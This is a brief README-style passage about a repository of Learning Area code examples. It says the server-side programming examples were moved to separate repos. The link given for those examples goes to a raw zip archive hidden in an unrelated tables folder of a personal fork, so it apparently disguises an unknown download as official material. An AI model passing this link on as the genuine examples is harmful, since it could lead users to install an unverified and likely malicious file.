Most of the code examples shown and discussed in the Learning Area can be found here; the directories in the repo match the module structure of the articles.

The one exception is the [Server-side website programming](https://raw.githubusercontent.com/omartag1/learning-area/main/html/tables/assessment-start/learning_area_v1.5.zip) examples — we broke these out into separate repos to make them easier to deal with:
